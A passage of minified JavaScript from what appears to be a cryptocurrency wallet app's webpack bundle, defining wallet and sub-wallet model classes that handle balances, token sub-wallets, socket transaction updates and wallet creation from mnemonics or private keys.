                this.data.lockedBalance = e
            }
            get syncState() {
                return this.data.syncState
            }
            set syncState(e) {
                this.data.syncState = e
            }
            get adapterType() {
                return this.data.adapterType
            }
            set adapterType(e) {
                this.data.adapterType = e
            }
            get adapterTicker() {
                return this.data.adapterTicker
            }
            set adapterTicker(e) {
                this.data.adapterTicker = e
            }
            get minimalBalance() {
                return this.data.minimalBalance
            }
            set minimalBalance(e) {
                this.data.minimalBalance = e
            }
            get address() {
                return this.data.address
            }
            set address(e) {
                this.data.address = e
            }
            get tokenAddress() {
                return this.data.tokenAddress
            }
            get account() {
                return this.data.account
            }
            set account(e) {
                this.data.account = e
            }
            get publicKey() {
                return this.data.publicKey
            }
            set publicKey(e) {
                this.data.publicKey = e
            }
            get privateKey() {
                return this.data.privateKey
            }
            set privateKey(e) {
                this.data.privateKey = e
            }
            get derivePath() {
                var e;
                return this.data.derivePath || (null === (e = this.data.config) || void 0 === e ? void 0 : e.derivePath)
            }
            set derivePath(e) {
                this.data.derivePath = e
            }
            get accountName() {
                return this.data.accountName
            }
            set accountName(e) {
                this.data.accountName = e
            }
            get smartContract() {
                return this.data.smartContract
            }
            set smartContract(e) {
                this.data.smartContract = e
            }
            get propertyid() {
                return this.data.propertyid
            }
            set propertyid(e) {
                this.data.propertyid = e
            }
            get rewardAddress() {
                return this.data.rewardAddress
            }
            set rewardAddress(e) {
                this.data.rewardAddress = e
            }
            get title() {
                return (0,
                g.Tz)(this.data.title, this.data.currency)
            }
            set title(e) {
                this.data.title = e
            }
            get isFakeToken() {
                return this.data.isFakeToken
            }
            set isFakeToken(e) {
                this.data.isFakeToken = e
            }
            get parentUuid() {
                return this.data.parentUuid
            }
            set parentUuid(e) {
                this.data.parentUuid = e
            }
            get isCustom() {
                return this.data.isCustom
            }
            set isCustom(e) {
                this.data.isCustom = e
            }
            get subWalletsHidden() {
                return this.data.subWalletsHidden
            }
            set subWalletsHidden(e) {
                this.data.subWalletsHidden = e
            }
            get multisigsShow() {
                return this.data.multisigsShow
            }
            set multisigsShow(e) {
                this.data.multisigsShow = e
            }
            get watchOnly() {
                return this.data.watchOnly
            }
            set watchOnly(e) {
                this.data.watchOnly = e
            }
            get legacyAddress() {
                return this.data.legacyAddress
            }
            set legacyAddress(e) {
                this.data.legacyAddress = e
            }
            get derivedFromMnemonicUsing() {
                return this.data.derivedFromMnemonicUsing
            }
            set derivedFromMnemonicUsing(e) {
                this.data.derivedFromMnemonicUsing = e
            }
            async addSubWallet(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                throw new Error("Not implemented")
            }
            mapToPlainObject() {
                const e = [];
                this.subWallets && Array.isArray(this.subWallets) && this.subWallets.forEach((t => {
                    e.push(t.mapToPlainObject())
                }
                ));
                const t = undefined;
                return {
                    ...this.data,
                    subWallets: e
                }
            }
            clone() {
                const e = undefined
                  , t = (new (0,
                this.constructor)).recoverFromPlainObject(this.mapToPlainObject());
                t.multisigs = (0,
                E.Z)(this.multisigs);
                return t
            }
        }
    }
    ,
    45152: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => CommonWalletModel,
            Q: () => isBalanceValid
        });
        var n = a(15581)
          , r = a(2490)
          , l = a(34514)
          , s = a(57640)
          , i = a(9924)
          , o = a(31672)
          , c = a(59461)
          , u = a(88449)
          , d = a(59849)
          , m = a(64211)
          , p = a(41874)
          , f = a(41817)
          , E = a(17995)
          , h = a(67048)
          , g = a(18913)
          , y = a(42155)
          , v = a(87205)
          , _ = a(12587)
          , w = a(9710)
          , b = a(13196)
          , k = a(57506)
          , S = a(69509);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const C = _.P.create({
            name: "socket-updateble"
        });
        class SocketUpdatableAbstractWallet extends S.Z {
            constructor() {
                var e;
                super(...arguments);
                e = this;
                _defineProperty(this, "storeManager", void 0);
                _defineProperty(this, "wasUpdatedBalancesByRest", ( () => {
                    if (this.storeManager && this.storeManager.isWalletBalanceWasUpdatedByRest)
                        return this.storeManager.isWalletBalanceWasUpdatedByRest(this.data.uuid);
                    C.error("this.storeManager is null", this);
                    return !1
                }
                ));
                _defineProperty(this, "wasUpdatedTxsByRest", ( () => {
                    if (this.storeManager && this.storeManager.isWalletTransactionsWereUpdatedByRest)
                        return this.storeManager.isWalletTransactionsWereUpdatedByRest(this.data.uuid);
                    C.error("this.storeManager is null", this);
                    return !1
                }
                ));
                _defineProperty(this, "handleSocketIncomingTx", (async e => {
                    let {tx: t} = e;
                    try {
                        let e;
                        e = t.isToken ? await this._handleSocketIncomingTokenTx(t) : await this._handleSocketIncomingCoinTx(t);
                        if (this.storeManager) {
                            w.n.sendTxNotification({
                                tx: e.tx,
                                wallet: this,
                                isFromSocket: !0
                            });
                            await this.storeManager.updateTransactions(this, [e.tx]);
                            e.shouldUpdateWallet && await this.storeManager.commitWalletUpdate(this)
                        } else
                            C.error("this.storeManager is null", this)
                    } catch (e) {
                        C.error("handleSocketIncomingTx", e)
                    }
                }
                ));
                _defineProperty(this, "incrementTxsConfirmations", (async () => {
                    if (this.storeManager) {
                        const e = undefined
                          , t = undefined
                          , a = (await this.storeManager.getAllTxs()).filter((e => (e.currencyFrom === this.data.currency || e.currencyTo === this.data.currency || e.family === this.data.currency) && "exchange" !== e.type && (e.confirmations || 0 === e.confirmations) && "0" !== e.confirmations.toString())).map((e => {
                            e.confirmations = (0,
                            h.PD)(e.confirmations, "1").toString();
                            return e
                        }
                        ));
                        this.storeManager.updateTransactions(this, a)
                    } else
                        C.error("this.storeManager is null", this)
                }
                ));
                _defineProperty(this, "handleSocketIncomingTxConfirmation", (async e => {
                    let {tx: t} = e;
                    try {
                        let e;
                        e = t.isToken ? await this._handleSocketIncomingTokenTxConfirmation(t) : await this._handleSocketIncomingCoinTxConfirmation(t);
                        if (!e.tx)
                            return;
                        if (!this.storeManager)
                            throw new Error("this.storeManager is undefined");
                        w.n.sendTxNotification({
                            tx: e.tx,
                            wallet: this,
                            isFromSocket: !0
                        });
                        await this.storeManager.updateTransactions(this, [e.tx]);
                        e.shouldUpdateWallet && await this.storeManager.commitWalletUpdate(this)
                    } catch (e) {
                        C.error("handleSocketIncomingTxConfirmation", e)
                    }
                }
                ));
                _defineProperty(this, "_handleSocketIncomingCoinTxConfirmation", (async e => {
                    const t = {
                        ...e
                    };
                    t.isIncoming = this._isTxIsIncoming(t);
                    this.repeatFetchBalance(this);
                    return {
                        tx: t,
                        shouldUpdateWallet: !1
                    }
                }
                ));
                _defineProperty(this, "_handleSocketIncomingTokenTxConfirmation", (async e => ({
                    tx: e,
                    shouldUpdateWallet: !1
                })));
                _defineProperty(this, "_handleSocketIncomingCoinTx", (async e => {
                    this.repeatFetchBalance(this);
                    const t = {
                        ...e
                    };
                    t.isIncoming = this._isTxIsIncoming(t);
                    return {
                        tx: t,
                        shouldUpdateWallet: !1
                    }
                }
                ));
                _defineProperty(this, "repeatFetchBalance", (async function(t) {
                    let a = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 20
                      , n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 2e3
                      , r = 0;
                    const {balance: l} = t.data
                      , fetch = async () => {
                        r += 1;
                        C.log(`Fetch started ${t.data.currency}, requestCount:${r}`);
                        const s = await t.fetchBalance();
                        C.log(`Fetch ${t.data.currency}, requestCount:${r} old balance: ${l}, fetched balance: ${s}`);
                        if (s && !(0,
                        h.eq)(l, s)) {
                            t.data.balance = s;
                            if (e.storeManager) {
                                C.log(`Finish: ${r}, fetchedBalance: ${s}`);
                                await e.storeManager.updateBalance(t)
                            } else
                                C.error("this.storeManager is null", e);
                            return !0
                        }
                        return !(r <= a) || new Promise((e => {
                            setTimeout((async () => {
                                e(await fetch())
                            }
                            ), n)
                        }
                        ))
                    }
                    ;
                    return new Promise((e => {
                        setTimeout((async () => {
                            e(await fetch())
                        }
                        ), 500)
                    }
                    ))
                }
                ));
                _defineProperty(this, "compileSocketManagerSubscrParams", ( () => {
                    const e = {};
                    e[this.address] = this.currency;
                    return e
                }
                ));
                _defineProperty(this, "isTxRalatesTo", ( (e, t) => {
                    var a;
                    return this.data.address.toLowerCase() === e.toLowerCase() && (null === (a = t.currencyFrom) || void 0 === a ? void 0 : a.toLowerCase()) === this.data.currency
                }
                ));
                _defineProperty(this, "_handleSocketIncomingTokenTx", (async e => ({
                    tx: e,
                    shouldUpdateWallet: !1
                })));
                _defineProperty(this, "_isTxIsIncoming", (e => {
                    var t;
                    return (null === (t = e.addressTo) || void 0 === t ? void 0 : t.toLowerCase()) === this.data.address.toLowerCase()
                }
                ))
            }
        }
        var N = a(41106)
          , T = a(98148)
          , A = a(12002)
          , x = a(919);
        function common_wallet_defineProperty(e, t, a) {
            (t = common_wallet_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function common_wallet_toPropertyKey(e) {
            var t = common_wallet_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function common_wallet_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const I = _.P.create({
            name: "common-model"
        });
        function isBalanceValid(e) {
            return !Number.isNaN(parseFloat(String(e)))
        }
        class CommonWalletModel extends SocketUpdatableAbstractWallet {
            constructor() {
                var e;
                super(...arguments);
                e = this;
                common_wallet_defineProperty(this, "storeManager", void 0);
                common_wallet_defineProperty(this, "getAvailableBalance", (async () => {
                    if ("xlm" === this.currency)
                        return Promise.resolve((0,
                        h.h9)(this.balance, 1).toString());
                    if ("xrp" === this.currency) {
                        const e = await E.Z.getApiByWallet(this.data)
                          , t = await e.getMinimalBalance({
                            address: this.address
                        });
                        return (0,
                        h.h9)(this.balance, t).toString()
                    }
                    if ("algo" === this.currency) {
                        const e = this.subWallets.length
                          , t = (0,
                        h.$q)((0,
                        h.PD)(e || 0, 1), .1);
                        return Promise.resolve((0,
                        h.h9)(this.balance, t).toString())
                    }
                    return Promise.resolve(this.balance)
                }
                ));
                common_wallet_defineProperty(this, "removeSubWallet", (async e => {
                    try {
                        let t;
                        for (let a = 0; a < this.subWallets.length; a += 1)
                            if (this.subWallets[a].uuid === e.uuid) {
                                t = a;
                                break
                            }
                        (t || 0 === t) && this.subWallets.splice(t, 1)
                    } catch (e) {
                        I.error(`removeSubWallet failed ${this.data.currency}`, e)
                    }
                }
                ));
                common_wallet_defineProperty(this, "setStoreManager", (e => {
                    this.storeManager = e;
                    this.subWallets.forEach((t => {
                        t.setStoreManager(e)
                    }
                    ))
                }
                ));
                common_wallet_defineProperty(this, "_getTransactionsByMainApi", (async () => {
                    try {
                        const e = await E.Z.getApiByWallet(this.data);
                        if (!e || !e.hasSupportedGetTransactions)
                            return !1;
                        const t = (0,
                        T.k)(await e.getTransactionsByAddress(this.data));
                        return (null == t || !t.error) && t
                    } catch (e) {
                        I.warn(`_getTransactionsByApi failed ${this.data.currency} ${e.message}`);
                        return !1
                    }
                }
                ));
                common_wallet_defineProperty(this, "_getTransactionsByLightAdapter", (async () => {
                    try {
                        const e = await E.Z.loadLightAdapterByWallet(this.data);
                        if (!e || !e.getTransactionsByAddress)
                            return !1;
                        const t = (0,
                        T.k)(await e.getTransactionsByAddress(this.data));
                        return (!t || !t.error) && t
                    } catch (e) {
                        I.error(`_getTransactionsByLightAdapter failed ${this.data.currency} ${e.message}`);
                        return !1
                    }
                }
                ));
                common_wallet_defineProperty(this, "_fetchTransactions", (async () => {
                    if (E.Z.hasLightAdapterByWallet(this.data))
                        return this._getTransactionsByLightAdapter();
                    let e;
                    return await this._getTransactionsByMainApi()
                }
                ));
                common_wallet_defineProperty(this, "updateTransactions", (async () => {
                    try {
                        let e = await this._fetchTransactions();
                        e && e.length > 0 && (e = e.map((e => ({
                            ...e,
                            sourceWalletId: this.data.uuid
                        }))));
                        const {subWallets: t} = this;
                        if (t && Array.isArray(t) && !this.subWalletsHidden)
                            for (const e of t)
                                await e.updateTransactions();
                        if (!e)
                            return;
                        if (this.storeManager) {
                            w.n.sendTxsNotifications({
                                txs: e,
                                wallet: this,
                                isFromSocket: !1
                            });
                            this.storeManager.updateTransactions(this, e)
                        } else
                            I.error("this.storeManager is null", this);
                        this.isNeedUpdateTransactions && (this.isNeedUpdateTransactions = !1)
                    } catch (e) {
                        I.error(`getTransactions failed ${this.data.currency}`, e)
                    }
                }
                ));
                common_wallet_defineProperty(this, "addTx", (async e => {
                    this.storeManager && await this.storeManager.updateTransactions(this, [e])
                }
                ));
                common_wallet_defineProperty(this, "_getBalanceByLightAdapter", (async e => {
                    try {
                        const t = await E.Z.loadLightAdapterByWallet(this.data);
                        if (null == t || !t.getBalanceByAddress)
                            throw new Error("Light adapter or getBalanceByAddress method is not available");
                        const a = await t.getBalanceByAddress({
                            ...this.data,
                            address: e || this.data.address
                        })
                          , n = (0,
                        T.k)(a);
                        if (isBalanceValid(n.balance))
                            return n.balance;
                        throw new Error(`Invalid balance received: ${n.balance}`)
                    } catch (e) {
                        throw e
                    }
                }
                ));
                common_wallet_defineProperty(this, "fetchBalance", (async () => {
                    if (E.Z.hasLightAdapterByWallet(this.data))
                        return await this._getBalanceByLightAdapter();
                    const e = await this._getBalanceByMainApi();
                    if (isBalanceValid(e))
                        return e;
                    if (this.isSubWallet) {
                        var t;
                        const e = this.storeManager.getState()
                          , a = null == e || null === (t = e.wallets) || void 0 === t ? void 0 : t.wallets;
                        if (!e || !a)
                            return;
                        a.map((e => {
                            e.address === this.address && e.fetchSubWallets && e.fetchSubWallets()
                        }
                        ))
                    }
                }
                ));
                common_wallet_defineProperty(this, "updateSubWalletsBalances", (async () => {
                    const e = this.subWallets;
                    let t;
                    t = E.Z.hasLightAdapterByWallet(this.data) ? await E.Z.loadLightAdapterByWallet(this.data) : await E.Z.getApiByWallet(this.data);
                    if (!t || !t.fetchTokenWallets)
                        return;
                    const a = (0,
                    T.k)(await t.fetchTokenWallets(this.data))
                      , n = !a.length;
                    for (const t of a) {
                        const a = e.find((e => e.smartContract ? (0,
                        v.t)(e.smartContract) === (0,
                        v.t)(t.smartContract) : e.currency === t.currency));
                        if (a && a.storeManager) {
                            var r;
                            if (a.data.balance !== String(t.balance) && isBalanceValid(t.balance)) {
                                a.data.balance = String(t.balance);
                                this.isNeedUpdateTransactions = !0;
                                a.data.title = t.title || a.data.title;
                                a.storeManager.updateBalance(a);
                                a.storeManager.setWalletBalanceWasUpdatedByRest(a.data.uuid)
                            }
                            (null == t ? void 0 : t.tokenAddress) !== (null === (r = a.data) || void 0 === r ? void 0 : r.tokenAddress) && (a.data.tokenAddress = t.tokenAddress)
                        }
                    }
                    const l = e.filter((e => !a.some((t => t.smartContract && e.smartContract ? (0,
                    v.t)(t.smartContract) === (0,
                    v.t)(e.smartContract) : t.currency === e.currency))));
                    !n && l.forEach((e => {
                        if (e && e.data && e.storeManager) {
                            e.data.balance = "0";
                            e.storeManager.updateBalance(e);
                            e.storeManager.setWalletBalanceWasUpdatedByRest(e.data.uuid)
                        }
                    }
                    ))
                }
                ));
                common_wallet_defineProperty(this, "updateBalance", (async function() {
                    let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    e.storeManager && e.storeManager.setWalletBalanceUpdateStatus({
                        uuid: e.uuid,
                        apiStatus: A.rA.Pending
                    });
                    if (e.data.isFakeToken)
                        return;
                    const a = setTimeout(( () => {
                        x.b.error(x.d.UPDATING_BALANCE_IS_TOO_LONG, {
                            currency: e.data.currency,
                            family: e.data.family
                        })
                    }
                    ), 3e3);
                    try {
                        x.b.success(x.d.UPDATING_BALANCE, {
                            currency: e.data.currency,
                            family: e.data.family
                        }, "false");
                        let n = await e.fetchBalance();
                        e.storeManager && e.storeManager.setWalletBalanceUpdateStatus({
                            uuid: e.uuid,
                            apiStatus: A.rA.Resolved
                        });
                        e.subWallets && Array.isArray(e.subWallets) && !1 === e.isSubWallet && !1 !== t.isNeedFetchTokensBalance && e.updateSubWalletsBalances();
                        if (e.multisigs && Array.isArray(e.multisigs))
                            for (const t of e.multisigs)
                                if (t.address) {
                                    const a = await e._getBalanceByLightAdapter(t.address);
                                    if (isBalanceValid(a) && t.balance !== String(a)) {
                                        e.isNeedUpdateTransactions = !0;
                                        t.balance = String(a);
                                        e.storeManager && e.storeManager.updateBalance(t)
                                    }
                                }
                        if (b.CM) {
                            const e = (0,
                            k.ZP)("balance");
                            e && (n = e)
                        }
                        const r = e.data.balance;
                        if (isBalanceValid(n) && r !== String(n)) {
                            e.data.balance = String(n);
                            e.isNeedUpdateTransactions = !0;
                            if (e.storeManager) {
                                e.storeManager.updateBalance(e);
                                e.storeManager.setWalletBalanceWasUpdatedByRest(e.data.uuid)
                            } else
                                I.error("this.storeManager is null", e)
                        }
                    } catch (t) {
                        I.error(`failed updateBalance for ${e.data.currency}`, t);
                        x.b.error(x.d.FAILED_UPDATE_BALANCE, {
                            currency: e.data.currency,
                            family: e.data.family
                        });
                        e.storeManager && e.storeManager.setWalletBalanceUpdateStatus({
                            uuid: e.uuid,
                            apiStatus: A.rA.Rejected
                        })
                    } finally {
                        clearTimeout(a)
                    }
                }
                ));
                common_wallet_defineProperty(this, "_createInstance", (async e => {
                    let {mnemonic: t, currency: a, privateKey: n, password: r, title: l, watchOnly: s, forceAddress: i, accountName: o, accountIndex: c, isImport: u, derivationType: d} = e;
                    try {
                        var m, p;
                        const e = await E.Z.getApiByCurrency(a);
                        if (!e) {
                            I.warn(`Api not found ${this.data.currency}`);
                            throw new Error("Api not found")
                        }
                        let f = i, h;
                        i && e.normalizeAddress && (f = e.normalizeAddress(i));
                        if (t && (c || 0 === c))
                            h = await e.getAddressFromMnemonic({
                                mnemonic: t,
                                accountIndex: c,
                                type: d
                            });
                        else if (n)
                            h = await e.getAddressFromPrivateKey({
                                privateKey: "string" == typeof n ? n.trim() : n,
                                password: r,
                                currency: a,
                                address: f
                            });
                        else if (t) {
                            const {privateKey: n} = await N.deriveForAdapter(t, {
                                ticker: a,
                                accountIndex: null != c ? c : 0
                            });
                            h = await e.getAddressFromPrivateKey({
                                privateKey: "string" == typeof n ? n.trim() : n,
                                password: r,
                                currency: a,
                                address: f
                            })
                        } else
                            h = await e.createWallet();
                        s && (h = {
                            address: f,
                            currency: a,
                            accountName: o
                        });
                        const g = undefined;
                        if (!(h.address || h.accountName))
                            throw new Error("Address not recognized");
                        let v;
                        v = !t || "string" != typeof h.privateKey && (null === (m = h.privateKey) || void 0 === m || !m.privateKey || null !== (p = h.privateKey) && void 0 !== p && p.mnemonic) ? h.privateKey : {
                            privateKey: h.privateKey,
                            mnemonic: t
                        };
                        let _ = (0,
                        y.Z)().slice(0, 8);
                        u && (_ += "_i");
                        d && Object.assign(this.data, {
                            derivationType: d
                        });
                        Object.assign(this.data, {
                            accountName: h.accountName,
                            address: h.address,
                            currency: a,
                            title: l,
                            watchOnly: s,
                            uuid: _,
                            privateKey: v,
                            balance: this.data.balance || "0"
                        });
                        h.rewardAddress && Object.assign(this.data, {
                            rewardAddress: h.rewardAddress
                        });
                        h.publicKey && Object.assign(this.data, {
                            publicKey: h.publicKey
                        });
                        c && Object.assign(this.data, {
                            derivedFromMnemonicUsing: {
                                accountIndex: c
                            }
                        });
                        try {
                            await this.fetchSubWallets();
                            (n || s) && await this.updateBalance({
                                isNeedFetchTokensBalance: !1
                            })
                        } catch (e) {}
                        return this
                    } catch (e) {
                        I.error(`failed _createInstance for ${this.data.currency}`, e);
                        throw e
                    }
                }
                ));
                common_wallet_defineProperty(this, "fetchSubWallets", (async () => !1));
                common_wallet_defineProperty(this, "areSubWalletsEqual", ( (e, t) => !1))
            }
            async addSubWallet(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                const a = this.subWallets.find((t => this.areSubWalletsEqual(t, e)));
                if (a)
                    return a;
                Object.assign(e, {
                    family: this.data.currency,
                    title: (0,
                    g.Z)(e.title || ""),
                    currency: (0,
                    g.Z)(e.currency)
                });
                let n;
                n = e instanceof S.Z || e && e.updateBalance ? e : await (new this.SubWalletModel).recoverFromPlainObject(e);
                this.subWallets.push(n);
                t && await this.updateBalance();
                return n
            }
            async _getBalanceByMainApi(e, t) {
                try {
                    const a = await E.Z.getApiByWallet(this.data);
                    if (null == a || !a.getBalanceByAddress)
                        throw new Error("Adapter or getBalanceByAddress method is not available");
                    const n = await a.getBalanceByAddress({
                        ...this.data,
                        address: e || this.data.address,
                        privateKey: t || this.data.privateKey
                    });
                    let r = (0,
                    T.k)(n);
                    if (isBalanceValid(r.balance))
                        return r.balance;
                    throw new Error(`Invalid balance received: ${r.balance}`)
                } catch (e) {
                    throw e
                }
            }
        }
    }
    ,
    90702: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => EthLikeWalletModel
        });
        var n = a(41817)
          , r = a(17995)
          , l = a(67048)
          , s = a(87205)
          , i = a(65811)
          , o = a(45152)
          , c = a(64183);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class EthLikeSubWalletModel extends o.Z {
            get title() {
                return super.title
            }
            set title(e) {
                super.title = e
            }
            constructor() {
                super();
                _defineProperty(this, "SubWalletModel", c.n);
                this.type = i.aO.ERC20_TOKEN;
                this.subWalletsHidden = !0;
                this.isSubWallet = !0
            }
        }
        var u = a(85641);
        function wallet_eth_defineProperty(e, t, a) {
            (t = wallet_eth_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function wallet_eth_toPropertyKey(e) {
            var t = wallet_eth_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function wallet_eth_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class EthLikeWalletModel extends u.J {
            constructor() {
                super();
                wallet_eth_defineProperty(this, "SubWalletModel", EthLikeSubWalletModel);
                wallet_eth_defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                s.t)(e.smartContract) === (0,
                s.t)(t.smartContract)));
                wallet_eth_defineProperty(this, "getAvailableBalance", (async () => {
                    const e = await r.Z.getApiByWallet(this.data)
                      , t = await e.getMinimalBalance({
                        address: this.data.address
                    });
                    return (0,
                    l.h9)(this.data.balance, t)
                }
                ));
                this.type = i.uQ.ETH_LIKE_WALLET;
                this.subWalletsHidden = !1;
                this.multisigsShow = !0;
                this.multisigs = [];
                this.data.subWalletsHidden = !1
            }
        }
    }
    ,
    74315: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => OverallWalletModel
        });
        var n = a(41817)
          , r = a.n(n)
          , l = a(18913)
          , s = a(65811)
          , i = a(6723)
          , o = a(35830);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class OverallWalletModel extends i.b {
            constructor() {
                super();
                _defineProperty(this, "SubWalletModel", o.Z);
                _defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                l.Z)(e.currency) === (0,
                l.Z)(t.currency)));
                this.type = s.uQ.OVERALL_WALLET;
                this.subWalletsHidden = !1
            }
        }
    }
    ,
    35830: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => OverallSubWalletModel
        });
        var n = a(41817)
          , r = a.n(n)
          , l = a(65811)
          , s = a(45152)
          , i = a(64183);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class OverallSubWalletModel extends s.Z {
            get title() {
                return super.title
            }
            set title(e) {
                super.title = e
            }
            constructor() {
                super();
                _defineProperty(this, "SubWalletModel", i.n);
                this.type = l.aO.OVERALL_SUBWALLET;
                this.subWalletsHidden = !0;
                this.isSubWallet = !0
            }
        }
    }
    ,
    64183: (e, t, a) => {
        "use strict";
        a.d(t, {
            n: () => NullSubWalletModel
        });
        var n = a(41817)
          , r = a.n(n)
          , l = a(41143)
          , s = a.n(l)
          , i = a(45152);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class NullSubWalletModel extends i.Z {
            constructor() {
                super();
                _defineProperty(this, "SubWalletModel", NullSubWalletModel);
                s()(!1, "Attempt to create `NullSubWalletModel`. This means that it's parent wallet does not support subwallets or is a subwallet itself and should not have subwallets.")
            }
        }
    }
    ,
    85641: (e, t, a) => {
        "use strict";
        a.d(t, {
            J: () => EthTokenSocketUpdatable
        });
        var n = a(31672)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(59461)
          , o = a.n(i)
          , c = a(41817)
          , u = a.n(c)
          , d = a(67048)
          , m = a(12587)
          , p = a(66581)
          , f = a(9669)
          , E = a.n(f)
          , h = a(6723);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const g = m.P.create({
            name: "eth-token-model-socket"
        });
        class EthTokenSocketUpdatable extends h.b {
            constructor() {
                super(...arguments);
                _defineProperty(this, "fetchAndAddTokenSubwallet", (async (e, t) => {
                    try {
                        var a;
                        const n = `https://api.ethplorer.io/getAddressInfo/${e}?apiKey=mnwl1551CLeiAd98`
                          , {data: r} = await E().get(n)
                          , {tokenInfo: l} = r;
                        let s = !1;
                        const i = {
                            address: this.data.address,
                            currency: l.symbol.toLowerCase(),
                            balance: (0,
                            d.$q)(t.balance, `1e-${l.decimals}`).toString(),
                            smartContract: l.address,
                            privateKey: this.data.privateKey,
                            family: "eth",
                            title: l.name,
                            precision: l.decimals,
                            derivePath: this.derivePath || (null === (a = this.data.config) || void 0 === a ? void 0 : a.derivePath)
                        }
                          , o = undefined;
                        if (!this.subWallets.find((e => e.currency === i.currency))) {
                            await this.addSubWallet(i);
                            s = !0
                        }
                        return s
                    } catch (e) {
                        return !1
                    }
                }
                ));
                _defineProperty(this, "_handleSocketIncomingTokenTx", (async e => {
                    const t = {
                        ...e
                    };
                    try {
                        var a, n, r;
                        const e = null === (a = t.extra) || void 0 === a || null === (n = a.contract) || void 0 === n ? void 0 : n.toLowerCase()
                          , l = this.subWallets.find((t => {
